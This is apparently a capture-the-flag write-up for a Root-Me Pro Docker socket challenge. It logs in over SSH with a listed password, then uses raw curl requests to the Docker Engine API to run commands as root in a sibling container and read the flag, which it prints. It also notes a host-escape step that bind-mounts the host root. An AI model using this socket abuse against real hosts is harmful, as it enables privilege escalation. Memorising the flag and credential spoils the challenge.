# Docker - Socket (Root-Me Pro, 450 pts, Medium)

## Access
- SSH: `ssh -p 32494 srv@sockets.challenges.root-me.pro`
- Pass: `Gj5ZUh^KZ6B@jknq@qf@`
- Used `expect` (ssh_run.exp) instead of sshpass since sshpass wasn't installed and sudo wasn't actually passwordless in this env.

## Enumeration
- `id` -> uid=1000(srv) groups=101(docker),1000(srv)  -> in docker group
- `/var/run/docker.sock` present, group `docker`, rw -> full Docker Engine API access
- No `docker` CLI binary on box, but `curl` and `nc` present -> talked to the API raw via
  `curl --unix-socket /var/run/docker.sock http://localhost/<endpoint>`
- `GET /version` -> Engine 28.3.3, API 1.51
- `GET /containers/json?all=true` -> two containers on same compose project "docker":
  - `srv` (us) - id 1fa92004d540..., only mount is docker.sock itself
  - `sysadmin` - id 7c2da41a849f..., no mounts, image `docker-sysadmin`, cmd `/bin/sh`
- `GET /images/json` -> `docker-srv:latest`, `docker-sysadmin:latest`

## Exploit
Docker socket access = full control of the host's Docker daemon, including every
sibling container, regardless of container network isolation. Proves the devs' claim
("secure as long as it's container-to-container") false: we never touched the
`sysadmin` container's network/SSH at all, went straight through the daemon API.

1. Create exec instance in `sysadmin` container:
   POST /containers/{sysadmin_id}/exec
   {"AttachStdout":true,"AttachStderr":true,"Cmd":["sh","-c","id; hostname; ls -la /root"]}
   -> returned uid=0(root) inside sysadmin, found /root/flag.txt (45 bytes)

2. Start the exec instance:
   POST /exec/{exec_id}/start {"Detach":false,"Tty":false}
   -> output is multiplexed stream (8-byte header per frame), strip and read as text.

3. Repeated exec with Cmd `["cat","/root/flag.txt"]` -> got flag directly.

## Flag
RM{5080a6ca5d26fd0dab3b74e2ea7e16a45132dc83}

## Notes / gotchas
- SSH connection got reset a couple times mid-session (kex_exchange_identification:
  read: Connection reset by peer) - looked like transient rate limiting on rapid
  reconnects, resolved with a short sleep + retry.
- Never needed to escape to the *host* itself (mounting host `/` into a new
  container) - full sibling-container root was enough to grab the flag and prove
  the point. Host escape via `POST /containers/create` with `Binds:["/:/host"]`
  would be the next step if the flag had been on the host instead.
